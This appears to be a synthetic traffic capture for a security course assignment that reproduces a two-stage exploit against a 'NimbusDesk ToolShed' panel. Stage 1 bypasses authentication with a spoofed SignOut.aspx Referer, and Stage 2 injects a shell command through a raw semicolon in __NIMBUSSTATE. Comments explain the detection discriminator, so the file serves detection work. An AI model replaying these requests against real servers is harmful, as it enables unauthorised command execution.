# =====================================================================
# NDSA-2026-0007 "TOOLSHED" - Synthetic exploitation traffic
# NimbusDesk ToolShed Panel Authentication Bypass + Unauthenticated RCE
# Author: Alfred Amoah  |  CIS*6580 Assignment 3, Part 3
#
# Two-stage exploit reproduced from the advisory:
#   Stage 1 (GET)  - spoofed Referer containing SignOut.aspx -> shed token
#   Stage 2 (POST) - __NIMBUSSTATE with a RAW semicolon and cmd= -> /bin/sh -c
#
# Key detection discriminator (per advisory): the exploit sends a raw,
# unencoded ';' (0x3b) in the body, whereas the benign Cloud Uptime
# Partner PING percent-encodes it as %3B.
# =====================================================================

# ---- Stage 1: Authentication bypass via spoofed Referer ----
flow attacker tcp 10.13.37.5:49200 > 10.10.10.20:80 (tcp.initialize;);

attacker > (content:"GET /_layouts/15/CIS*6580-Assignment3/ToolShed.aspx?DisplayMode=Edit&a=/ToolShed.aspx&mode=teapot HTTP/1.1\x0d\x0aHost: portal.nimbusdesk.local\x0d\x0aReferer: /_layouts/15/CIS*6580-Assignment3/SignOut.aspx\x0d\x0aUser-Agent: Mozilla/5.0\x0d\x0aStudentName: Alfred Amoah\x0d\x0aConnection: keep-alive\x0d\x0a\x0d\x0a";);

attacker < (content:"HTTP/1.1 200 OK\x0d\x0aContent-Type: text/html\x0d\x0aX-NimbusDesk-ShedToken: 4f9c-teapot-771a\x0d\x0aContent-Length: 0\x0d\x0a\x0d\x0a";);

# ---- Stage 2: Command execution with raw-semicolon __NIMBUSSTATE ----
attacker > (content:"POST /_layouts/15/CIS*6580-Assignment3/ToolShed.aspx?DisplayMode=Edit&a=/ToolShed.aspx&mode=teapot HTTP/1.1\x0d\x0aHost: portal.nimbusdesk.local\x0d\x0aReferer: /_layouts/15/CIS*6580-Assignment3/SignOut.aspx\x0d\x0aX-NimbusDesk-ShedToken: 4f9c-teapot-771a\x0d\x0aStudentName: Alfred Amoah\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0aContent-Length: 58\x0d\x0a\x0d\x0a__NIMBUSSTATE=RUN;cmd=echo \x22CIS*6580-Assignment3\x22 | id";);

attacker < (content:"HTTP/1.1 200 OK\x0d\x0aContent-Type: text/plain\x0d\x0aContent-Length: 46\x0d\x0a\x0d\x0auid=1000(nimbus) gid=1000(nimbus) groups=1000(nimbus)";);
